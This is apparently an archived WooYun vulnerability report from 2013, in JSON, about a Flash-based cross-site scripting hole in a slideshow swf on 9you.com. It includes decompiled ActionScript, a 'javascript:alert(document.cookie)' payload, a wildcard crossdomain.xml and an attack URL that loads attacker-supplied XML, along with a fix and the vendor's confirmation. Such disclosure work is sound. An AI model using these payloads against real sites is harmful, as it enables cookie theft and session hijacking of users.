{"id": 13798, "wybug_id": "wooyun-2013-018472", "wybug_title": "久游网FLASH安全问题深入分析与利用(一)", "wybug_corp": "久游网", "wybug_author": "_Evil", "wybug_date": "2013-02-08 13:16", "wybug_open_date": "2013-03-25 13:17", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-02-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-02-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-02-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-02-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-03-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-03-25：\t细节向公众公开  简要描述： getURL安全问题. 详细说明：  案例:\nlh.9you.com/web_v3/bcastr.swf?bcastr_xml_url=xml/bcastr.xml\n这类型调用方式, 调用的外部配置或数据文件后缀，如: xml等Flash的actionscript脚本目前网络上存在2种版本，即2.0与3.0函数A内容如下：\n//as3.0版本navigateToURL(new URLRequest(参数), \"_self\");//as2.0版本getURL(参数,\"_self\");\n案例是2.0版本的.其中参数就是被打开的链接。如果参数是 \"javascript:alert(1)\"那么就可以执行JS代码了。这里的点击执行代码的效果类似于网页里的\n<a href=\"javascript:alert(1)\">点我弹出1</a>\n我们先看看xml配置文件中的信息:\n\nitem_url 为显示的图片地址link   点击图片的跳转的参数;此为上面所讲的可控参数.逆向看看这个swf:\ngetURL(bcastr_link_array[this.id], \"_blank\");\n找到类似代码,我们看变量名字可以看出bcastr_link_array因该是link标签的数组,跟踪下bcastr_link_array.\nbcastr_link_array = new Array();............................. while (i < item_total_num)         {            bcastr_flie_array.push(bcastr_xml.firstChild.childNodes[i].attributes.item_url);            bcastr_title_array.push(bcastr_xml.firstChild.childNodes[i].attributes.itemtitle);            bcastr_link_array.push(bcastr_xml.firstChild.childNodes[i].attributes.link);            ++i;        }\n证明了我们的猜想,数组循环赋值.   漏洞证明：  漏洞利用:将link标签地址转换为我们的攻击代码,如\njavascript:alert(document.cookie);\n跨域操作.在我们自己网站的根目录下，放置一个 crossdomain.xml\n<?xml version=\"1.0\"?><cross-domain-policy>\t<allow-access-from domain=\"网站\" /></cross-domain-policy>\n本例子中网站->改为:*.9you.com(匹配任意的9you.com子域名)最后的攻击连接:\nhttp://lh.9you.com/web_v3/bcastr.swf?bcastr_xml_url=http://127.0.0.1:8080/bcastr.xml\n\nhttp://127.0.0.1:8080/bcastr.xml\n为我搭建的环境.\n\n\n\n好了点击下里面的图片.\n\n   修复方案：  对XML中传入的link url进行正则判断或者限制加载第三方网站的XML文件 贵站排查好这类型的swf文件,我就不刷分了哈哈.   版权声明：转载请注明来源 _Evil@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-02-08 14:25 厂商回复： 漏洞可以对客户端造成攻击。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-10 16:18 |    \t\t毛猴 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:18        | 一 只 怀 有 梦 想 的 猴 ......)\t\t \n  够详细    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}